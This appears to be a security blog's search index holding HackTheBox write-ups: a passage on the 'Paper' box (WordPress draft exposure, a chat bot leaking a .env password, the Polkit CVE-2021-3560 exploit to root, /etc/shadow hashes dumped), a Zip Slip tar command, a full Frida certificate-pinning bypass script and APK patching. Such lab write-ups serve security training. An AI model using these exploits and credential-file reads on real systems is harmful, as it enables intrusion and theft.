Detection)    | Confidence: 100%        [+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).    | Found By: Rss Generator (Passive Detection)    |  - http://office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;    |  - http://office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;        [+] WordPress theme in use: construction-techup    | Location: http://office.paper/wp-content/themes/construction-techup/    | Last Updated: 2021-07-17T00:00:00.000Z    | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt    | [!] The version is out of date, the latest version is 1.4    | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1    | Style Name: Construction Techup    | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...    | Author: wptexture    | Author URI: https://testerwp.com/    |    | Found By: Css Style In Homepage (Passive Detection)    |    | Version: 1.1 (80% confidence)    | Found By: Style (Passive Detection)    |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'        [+] Enumerating All Plugins (via Passive Methods)        [i] No plugins Found.        [+] Enumerating Config Backups (via Passive and Aggressive Methods)    Checking Config Backups - Time: 00:00:01 &lt;=============================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:01        [i] No Config Backups Found.        [!] No WPScan API Token given, as a result vulnerability data has not been output.   [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register        [+] Finished: Sat May  7 17:54:44 2022   [+] Requests Done: 139   [+] Cached Requests: 35   [+] Data Sent: 34.539 KB   [+] Data Received: 28.126 KB   [+] Memory used: 231.141 MB   [+] Elapsed time: 00:00:04        ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/Paper]                                                                                                                                                                                                         ‚îî‚îÄ$ wpscan --url office.paper -e ap,vt,cb,dbe,u --plugins-version-detection aggressive --plugins-detection aggressive   ...   [+] prisonmike    | Found By: Author Posts - Author Pattern (Passive Detection)    | Confirmed By:    |  Rss Generator (Passive Detection)    |  Wp Json Api (Aggressive Detection)    |   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1    |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)    |  Login Error Messages (Aggressive Detection)        [+] nick    | Found By: Wp Json Api (Aggressive Detection)    |  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1    | Confirmed By:    |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)    |  Login Error Messages (Aggressive Detection)        [+] creedthoughts    | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)    | Confirmed By: Login Error Messages (Aggressive Detection)           chat.office.paper (discovered exploiting Unauthenticated View Private/Draft Posts) Browsed chat.office.paper:    Browsed the secret path, registered a user and enumerated private chats:  http://chat.office.paper/register/8qozr226AhkCHZdyY     üîë 0xbro     maoutis          recyclops Bot 11:21 AM kellylikescupcakes Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers. Most frequently asked questions include: - What time is it? - What new files are in your sales directory? - Why did the salesman crossed the road? - What's the content of file x in your sales directory? etc. Please note that I am a beta version and I still have some bugs to be fixed. How to use me ? : 1. Small Talk: You can ask me how dwight's weekend was, or did he watched the game last night etc. eg: 'recyclops how was your weekend?' or 'recyclops did you watched the game last night?' or 'recyclops what kind of bear is the best? 2. Joke: You can ask me Why the salesman crossed the road. eg: 'recyclops why did the salesman crossed the road?' &lt;=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====&gt; For security reasons, the access is limited to the Sales folder. 3. Files: eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt' 4. List: You can ask me to list the files 5. Time: You can ask me to what the time is   Exploitation  WordPress &lt;= 5.2.3 - Unauthenticated View Private/Draft Posts (CVE-2019-17671)    PoC: http://office.paper/?static=1    Exploiting recyclops features      $ list .. Fetching the directory listing of .. total 32 drwx------ 11 dwight dwight 281 Feb 6 07:46 . drwxr-xr-x. 3 root root 20 Jan 14 06:50 .. lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -&gt; /dev/null -rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout -rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile -rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc -rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_restart.sh drwx------ 5 dwight dwight 56 Jul 3 2021 .config -rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot -rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history drwx------ 3 dwight dwight 19 Jul 3 2021 .local drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales drwx------ 2 dwight dwight 6 Sep 16 2021 .ssh -r-------- 1 dwight dwight 33 May 7 17:23 user.txt drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim total 32  $ list ../hubot drwx------ 8 dwight dwight 4096 Sep 16 2021 . drwx------ 11 dwight dwight 281 Feb 6 07:46 .. -rw-r--r-- 1 dwight dwight 0 Jul 3 2021 \\ srwxr-xr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8000 srwxrwxr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8080 drwx--x--x 2 dwight dwight 36 Sep 16 2021 bin -rw-r--r-- 1 dwight dwight 258 Sep 16 2021 .env -rwxr-xr-x 1 dwight dwight 2 Jul 3 2021 external-scripts.json drwx------ 8 dwight dwight 163 Jul 3 2021 .git -rw-r--r-- 1 dwight dwight 917 Jul 3 2021 .gitignore -rw-r--r-- 1 dwight dwight 135675 May 7 18:47 .hubot.log -rwxr-xr-x 1 dwight dwight 1068 Jul 3 2021 LICENSE drwxr-xr-x 89 dwight dwight 4096 Jul 3 2021 node_modules drwx--x--x 115 dwight dwight 4096 Jul 3 2021 node_modules_bak -rwxr-xr-x 1 dwight dwight 1062 Sep 16 2021 package.json -rwxr-xr-x 1 dwight dwight 972 Sep 16 2021 package.json.bak -rwxr-xr-x 1 dwight dwight 30382 Jul 3 2021 package-lock.json -rwxr-xr-x 1 dwight dwight 14 Jul 3 2021 Procfile -rwxr-xr-x 1 dwight dwight 5044 Jul 3 2021 README.md drwx--x--x 2 dwight dwight 193 Jan 13 10:56 scripts -rwxr-xr-x 1 dwight dwight 100 Jul 3 2021 start_bot.sh drwx------ 2 dwight dwight 25 Jul 3 2021 .vscode -rwxr-xr-x 1 dwight dwight 29951 Jul 3 2021 yarn.lock  $ file ../hubot/.env &lt;!=====Contents of file ../hubot/.env=====&gt; export ROCKETCHAT_URL='http://127.0.0.1:48320' export ROCKETCHAT_USER=recyclops export ROCKETCHAT_PASSWORD=Queenofblad3s!23 export ROCKETCHAT_USESSL=false export RESPOND_TO_DM=true export RESPOND_TO_EDITED=true export PORT=8000 export BIND_ADDRESS=127.0.0.1 &lt;!=====End of file ../hubot/.env=====&gt;    üîë recyclops     Queenofblad3s!23 dwight     Queenofblad3s!23    Logged in trough SSH re-using recyclops password:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/Paper] ‚îî‚îÄ$ ssh dwight@office.paper dwight@office.paper's password: Activate the web console with: systemctl enable --now cockpit.socket  Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23 [dwight@paper ~]$ id; hostname; ip a; cat /home/dwight/user.txt uid=1004(dwight) gid=1004(dwight) groups=1004(dwight) paper 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00     inet 127.0.0.1/8 scope host lo        valid_lft forever preferred_lft forever     inet6 ::1/128 scope host        valid_lft forever preferred_lft forever 2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000     link/ether 00:50:56:b9:e7:ed brd ff:ff:ff:ff:ff:ff     inet 10.10.11.143/23 brd 10.10.11.255 scope global noprefixroute eth0        valid_lft forever preferred_lft forever     inet6 dead:beef::250:56ff:feb9:e7ed/64 scope global dynamic mngtmpaddr        valid_lft 86399sec preferred_lft 14399sec     inet6 fe80::250:56ff:feb9:e7ed/64 scope link        valid_lft forever preferred_lft forever 3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default qlen 1000     link/ether 52:54:00:9b:e7:f7 brd ff:ff:ff:ff:ff:ff     inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0        valid_lft forever preferred_lft forever 4: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc fq_codel master virbr0 state DOWN group default qlen 1000     link/ether 52:54:00:9b:e7:f7 brd ff:ff:ff:ff:ff:ff 83482a8c2adcc4a365993c3653dc9517   Privilege Escalation  Local enumeration  Enumerated local users:  [dwight@paper ~]$ cat /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin polkitd:x:998:996:User for polkitd:/:/sbin/nologin geoclue:x:997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin qemu:x:107:107:qemu user:/:/sbin/nologin apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin cockpit-ws:x:996:993:User for cockpit-ws:/:/sbin/nologin pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin unbound:x:995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin gluster:x:994:989:GlusterFS daemons:/run/gluster:/sbin/nologin chrony:x:993:987::/var/lib/chrony:/sbin/nologin libstoragemgmt:x:992:986:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin saslauth:x:991:76:Saslauthd user:/run/saslauthd:/sbin/nologin dnsmasq:x:985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin radvd:x:75:75:radvd user:/:/sbin/nologin clevis:x:984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin sssd:x:983:981:User for sssd:/:/sbin/nologin colord:x:982:980:User for colord:/var/lib/colord:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin setroubleshoot:x:981:979::/var/lib/setroubleshoot:/sbin/nologin pipewire:x:980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin gdm:x:42:42::/var/lib/gdm:/sbin/nologin gnome-initial-setup:x:979:977::/run/gnome-initial-setup/:/sbin/nologin insights:x:978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin nginx:x:977:975:Nginx web server:/var/lib/nginx:/sbin/nologin mongod:x:976:974:mongod:/var/lib/mongo:/bin/false rocketchat:x:1001:1001::/home/rocketchat:/bin/bash dwight:x:1004:1004::/home/dwight:/bin/bash   Enumerated local services:  [dwight@paper Rocket.Chat]$ netstat -polentau | grep -vE 'WAIT|ESTABLISHED' (Not all processes could be identified, non-owned process info  will not be shown, you would have to be root to see it all.) Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      0          37378      -                    off (0.00/0/0) tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          30043      -                    off (0.00/0/0) tcp        0      0 127.0.0.1:48320         0.0.0.0:*               LISTEN      1001       40366      -                    off (0.00/0/0) tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      1004       42932      2403/node            off (0.00/0/0) tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      27         34774      -                    off (0.00/0/0) tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      976        32842      -                    off (0.00/0/0) tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      27         38979      -                    off (0.00/0/0) tcp6       0      0 :::22                   :::*                    LISTEN      0          30054      -                    off (0.00/0/0) tcp6       0      0 :::443                  :::*                    LISTEN      0          33812      -                    off (0.00/0/0) tcp6       0      0 :::80                   :::*                    LISTEN      0          33797      -                    off (0.00/0/0) udp        0      0 0.0.0.0:58176           0.0.0.0:*                           70         29806      -                    off (0.00/0/0) udp        0      0 192.168.122.1:53        0.0.0.0:*                           0          37377      -                    off (0.00/0/0) udp        0      0 0.0.0.0:67              0.0.0.0:*                           0          37374      -                    off (0.00/0/0) udp        0      0 0.0.0.0:5353            0.0.0.0:*                           70         29804      -                    off (0.00/0/0) udp        0      0 127.0.0.1:323           0.0.0.0:*                           0          27599      -                    off (0.00/0/0) udp6       0      0 :::5353                 :::*                                70         29805      -                    off (0.00/0/0) udp6       0      0 :::46316                :::*                                70         29807      -                    off (0.00/0/0) udp6       0      0 ::1:323                 :::*                                0          27600      -                    off (0.00/0/0)   Linepeas findings:  ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ CVEs Check Vulnerable to CVE-2021-3560 ... ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ PATH                                                                                                                                                                                                                            ‚ïö https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                                                                                                      /home/dwight/.local/bin:/home/dwight/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin                                                                                                                                                   New path exported: /home/dwight/.local/bin:/home/dwight/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin ... ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Executing Linux Exploit Suggester                                                                                                                                                                                               ‚ïö https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                           [+] [CVE-2021-4034] PwnKit                                                                                                                                                                                                                                                                                                                                                                                                                                                                   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt                                                                                                                                                                          Exposure: less probable                                                                                                                                                                                                                      Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro                                                                                                                                                           Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main                                                                                                                                                                                                                                                                                                                                                                                                                [+] [CVE-2021-3156] sudo Baron Samedit                                                                                                                                                                                                                                                                                                                                                                                                                                                       Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt                                                                                                                                          Exposure: less probable                                                                                                                                                                                                                      Tags: mint=19,ubuntu=18|20, debian=10                                                                                                                                                                                                        Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main                                                                                                                                                                                                                                                                                                                                                                                                                [+] [CVE-2021-3156] sudo Baron Samedit 2                                                                                                                                                                                                                                                                                                                                                                                                                                                     Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt                                                                                                                                          Exposure: less probable                                                                                                                                                                                                                      Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10                                                                                                                                                                                     Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main                                                                                                                                                                                                                                                                                                                                                                                                               [+] [CVE-2021-22555] Netfilter heap out-of-bounds write                                                                                                                                                                                                                                                                                                                                                                                                                                      Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html                                                                                                                                                   Exposure: less probable                                                                                                                                                                                                                      Tags: ubuntu=20.04{kernel:5.8.0-*}                                                                                                                                                                                                           Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c                                                                                                                          ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c                                                                                                                                            Comments: ip_tables kernel module must be loaded                                                                                                                                                                                                                                                                                                                                                                                                                                       [+] [CVE-2019-18634] sudo pwfeedback                                                                                                                                                                                                                                                                                                                                                                                                                                                         Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/                                                                                                                                                                                   Exposure: less probable                                                                                                                                                                                                                      Tags: mint=19                                                                                                                                                                                                                                Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c                                                                                                                                                       Comments: sudo configuration requires pwfeedback to be enabled.                                                                                                                                                                            [+] [CVE-2019-15666] XFRM_UAF     Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc    Exposure: less probable    Download URL:     Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled  [+] [CVE-2019-13272] PTRACE_TRACEME     Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903    Exposure: less probable    Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},debian=10{kernel:4.19.0-*},fedora=30{kernel:5.0.9-*}    Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip    ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c    Comments: Requires an active PolKit agent. ...   Polkit Privilege Escalation (CVE-2021-3560)  https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation  Executed the PoC and elevated to root:  [dwight@paper shm]$ ./poc.sh -u=maoutis -p=maoutis  [!] Username set as : maoutis [!] No Custom Timing specified. [!] Timing will be detected Automatically [!] Force flag not set. [!] Vulnerability checking is ENABLED! [!] Starting Vulnerability Checks... [!] Checking distribution... [!] Detected Linux distribution as \"centos\" [!] Checking if Accountsservice and Gnome-Control-Center is installed [+] Accounts service and Gnome-Control-Center Installation Found!! [!] Checking if polkit version is vulnerable [+] Polkit version appears to be vulnerable!! [!] Starting exploit... [!] Inserting Username maoutis... Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required [+] Inserted Username maoutis  with UID 1005! [!] Inserting password hash... [!] It looks like the password insertion was succesful! [!] Try to login as the injected user using su - maoutis [!] When prompted for password, enter your password [!] If the username is inserted, but the login fails; try running the exploit again. [!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell! [dwight@paper shm]$ su maoutis Password: [maoutis@paper shm]$ id uid=1005(maoutis) gid=1005(maoutis) groups=1005(maoutis),10(wheel) [maoutis@paper shm]$ sudo bash  We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things:      #1) Respect the privacy of others.     #2) Think before you type.     #3) With great power comes great responsibility.  [sudo] password for maoutis: [root@paper shm]## id; hostname; ip a; cat /root/root.txt uid=0(root) gid=0(root) groups=0(root) paper 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00     inet 127.0.0.1/8 scope host lo        valid_lft forever preferred_lft forever     inet6 ::1/128 scope host        valid_lft forever preferred_lft forever 2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000     link/ether 00:50:56:b9:68:99 brd ff:ff:ff:ff:ff:ff     inet 10.10.11.143/23 brd 10.10.11.255 scope global noprefixroute eth0        valid_lft forever preferred_lft forever     inet6 dead:beef::250:56ff:feb9:6899/64 scope global dynamic mngtmpaddr        valid_lft 86398sec preferred_lft 14398sec     inet6 fe80::250:56ff:feb9:6899/64 scope link        valid_lft forever preferred_lft forever 3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default qlen 1000     link/ether 52:54:00:9b:e7:f7 brd ff:ff:ff:ff:ff:ff     inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0        valid_lft forever preferred_lft forever 4: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc fq_codel master virbr0 state DOWN group default qlen 1000     link/ether 52:54:00:9b:e7:f7 brd ff:ff:ff:ff:ff:ff c268c00c67c62ae24f54749c8469fd03     Trophy    User.txt  83482a8c2adcc4a365993c3653dc9517  Root.txt  c268c00c67c62ae24f54749c8469fd03  /etc/shadow  [root@paper shm]## cat /etc/shadow | grep '\\$' root:$6$rfCS6Tb3sgIjkTux$UhBHq5wWPncgtVnltzm3Squ9KBcX3/9k0y6o8AG6lNSKOobHatUWFzPS1J8uuh/QML6kyhZ10ngXa5nCBLDkL.:18811:0:99999:7::: dwight:$6$xVlcDig.sohk9jK0$BZEhwP6SZytZTTAMTqjb35j02yMHq/F4jl3WPwqFCtsf0Cbce4pqo3PS8OGXiJdXGE/C4Y4yQZAmiT60wt9OQ/:18811:0:99999:7:::"
  },
  
  {
    "title": "Exploit Zip Slip vulnerability in python tarfile",
    "url": "/posts/exploit-zip-slip-vulnerability-in-python-tarfile/",
    "categories": "Articles & Writeups, Web Hacking",
    "tags": "hackthebox, python",
    "date": "2022-04-25 00:00:00 +0200",
    "content": "Introduction Slippy is an easy difficulty web challenge from HackTheBox vulnerable to Zip Slip because of the insecure use of the TarFile‚Äôs python module ‚Äúextractall‚Äù. Due to the absence of file name checks it is possible to create a malicious archive containing path traversals in order to overwrite other files and obtain remote code execution.  Improved skills    Code review   Exploit Zip Slip vulnerability to get RCE   Used tools    burpsuite   tar   Video   Notes Generate malicious tar.gz files containing relative path tar -czvf files.tar.gz --absolute-names '../../../../../tmp/test.txt'  You can also use evilarc.py  tarfile and zip slip vulneraiblity related articles and notes    tarfile and directory traversal vulnerability   tarfile: Traversal attack vulnerability   Zip Slip Vulnerability - Snyk   Exploiting insecure file extraction in Python for code execution"
  },
  
  {
    "title": "Bypass certificate pinning with Frida and Xposed",
    "url": "/posts/certificate-pinning-bypass/",
    "categories": "Articles & Writeups, Android",
    "tags": "hackthebox, android",
    "date": "2022-03-31 00:00:00 +0200",
    "content": "Introduction Learn how to bypass a certificate pinning protection using Frida and Xposed in order to intercept application‚Äôs requests and obtain the secret flag.  Improved skills    Disassemble APK   Decompile .dex file   Reverse Engineering Android applications   Hook Java functions   Bypass certificate pinning security implementations   Used tools    APKTool   bytecode-viewer   Frida   Xposed, TrustMeAlready, SSLUnpinning   Burpsuite   Video   Notes Universal Android SSL Pinning Bypass (from codeshare.frida.re) https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/ /*     Android SSL Re-pinning frida script v0.2 030417-pier      $ adb push burpca-cert-der.crt /data/local/tmp/cert-der.crt    $ frida -U -f it.app.mobile -l frida-android-repinning.js --no-pause     https://techblog.mediaservice.net/2017/07/universal-android-ssl-pinning-bypass-with-frida/        UPDATE 20191605: Fixed undeclared var. Thanks to @oleavr and @ehsanpc9999 ! */  setTimeout(function(){     Java.perform(function (){     \tconsole.log(\"\"); \t    console.log(\"[.] Cert Pinning Bypass/Re-Pinning\");  \t    var CertificateFactory = Java.use(\"java.security.cert.CertificateFactory\"); \t    var FileInputStream = Java.use(\"java.io.FileInputStream\"); \t    var BufferedInputStream = Java.use(\"java.io.BufferedInputStream\"); \t    var X509Certificate = Java.use(\"java.security.cert.X509Certificate\"); \t    var KeyStore = Java.use(\"java.security.KeyStore\"); \t    var TrustManagerFactory = Java.use(\"javax.net.ssl.TrustManagerFactory\"); \t    var SSLContext = Java.use(\"javax.net.ssl.SSLContext\");  \t    // Load CAs from an InputStream \t    console.log(\"[+] Loading our CA...\") \t    var cf = CertificateFactory.getInstance(\"X.509\"); \t     \t    try { \t    \tvar fileInputStream = FileInputStream.$new(\"/data/local/tmp/cert-der.crt\"); \t    } \t    catch(err) { \t    \tconsole.log(\"[o] \" + err); \t    } \t     \t    var bufferedInputStream = BufferedInputStream.$new(fileInputStream); \t  \tvar ca = cf.generateCertificate(bufferedInputStream); \t    bufferedInputStream.close();  \t\tvar certInfo = Java.cast(ca, X509Certificate); \t    console.log(\"[o] Our CA Info: \" + certInfo.getSubjectDN());  \t    // Create a KeyStore containing our trusted CAs \t    console.log(\"[+] Creating a KeyStore for our CA...\"); \t    var keyStoreType = KeyStore.getDefaultType(); \t    var keyStore = KeyStore.getInstance(keyStoreType); \t    keyStore.load(null, null); \t    keyStore.setCertificateEntry(\"ca\", ca); \t     \t    // Create a TrustManager that trusts the CAs in our KeyStore \t    console.log(\"[+] Creating a TrustManager that trusts the CA in our KeyStore...\"); \t    var tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm(); \t    var tmf = TrustManagerFactory.getInstance(tmfAlgorithm); \t    tmf.init(keyStore); \t    console.log(\"[+] Our TrustManager is ready...\");  \t    console.log(\"[+] Hijacking SSLContext methods now...\") \t    console.log(\"[-] Waiting for the app to invoke SSLContext.init()...\")  \t   \tSSLContext.init.overload(\"[Ljavax.net.ssl.KeyManager;\", \"[Ljavax.net.ssl.TrustManager;\", \"java.security.SecureRandom\").implementation = function(a,b,c) { \t   \t\tconsole.log(\"[o] App invoked javax.net.ssl.SSLContext.init...\"); \t   \t\tSSLContext.init.overload(\"[Ljavax.net.ssl.KeyManager;\", \"[Ljavax.net.ssl.TrustManager;\", \"java.security.SecureRandom\").call(this, a, tmf.getTrustManagers(), c); \t   \t\tconsole.log(\"[+] SSLContext initialized with our custom TrustManager!\"); \t   \t}     }); },0);   Hook application functions with Frida # Already pushed and started frida server $ adb push burpca-cert-der.crt /data/local/tmp/cert-der.crt  $ frida -U -f com.example.pinned -l unpin.js --no-pause      ____     / _  |   Frida 15.1.17 - A world-class dynamic instrumentation toolkit    | (_| |     &gt; _  |   Commands:    /_/ |_|       help      -&gt; Displays the help system    . . . .       object?   -&gt; Display information about 'object'    . . . .       exit/quit -&gt; Exit    . . . .    . . . .   More info at https://frida.re/docs/home/    . . . .    . . . .   Connected to Google Nexus 5X (id=192.168.164.104:5555) Spawned `com.example.pinned`. Resuming main thread! [Google Nexus 5X::com.example.pinned ]-&gt; [.] Cert Pinning Bypass/Re-Pinning [+] Loading our CA... [o] Our CA Info: CN=PortSwigger CA, OU=PortSwigger CA, O=PortSwigger, L=PortSwigger, ST=PortSwigger, C=PortSwigger [+] Creating a KeyStore for our CA... [+] Creating a TrustManager that trusts the CA in our KeyStore... [+] Our TrustManager is ready... [+] Hijacking SSLContext methods now... [-] Waiting for the app to invoke SSLContext.init()... [o] App invoked javax.net.ssl.SSLContext.init... [+] SSLContext initialized with our custom TrustManager!"
  },
  
  {
    "title": "Reverse and patch an easy APK",
    "url": "/posts/reverse-and-patch-an-easy-apk/",
    "categories": "Articles & Writeups, Android",
    "tags": "hackthebox, android",
    "date": "2022-03-15 00:00:00 +0100",
    "content": "Introduction Learn how to disassemble, decompile, reverse, analyse and patch an easy APK in this Android HackTheBox challange called APKrypt.  Improved skills    Disassemble APK   Decompile .dex file   Reverse Engineering Android applications   Patch and rebuild modified .smali code   Used tools    APKTool   dex2jar   jadx-gui   bytecode-viewer   JD-GUI   keytool &amp; jarsigner   Video   Notes Decompile APK $ apktool d APKrypt.apk Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true I: Using Apktool 2.5.0-dirty on APKrypt.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs... I: Baksmaling classes.dex... I: Copying assets and libs... I: Copying unknown files... I: Copying original files...  $ ls APKrypt AndroidManifest.xml  apktool.yml  original  res  smali   Patch, rebuild, and sign the modified APK $ echo -n maoutis | md5sum 6f2ae4978075eae54f9491744818d28d  -  $ grep -ri \"735c3628699822c4c1c09219f317a8e9\" smali/com/example/apkrypt/MainActivity$1.smali:    const-string v0, \"735c3628699822c4c1c09219f317a8e9\"  $ sed -i 's/735c3628699822c4c1c09219f317a8e9/6f2ae4978075eae54f9491744818d28d/' smali/com/example/apkrypt/MainActivity\\$1.smali  $ java -jar /opt/Android/apktool_2.6.1.jar b ./APKrypt Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true I: Using Apktool 2.6.1 I: 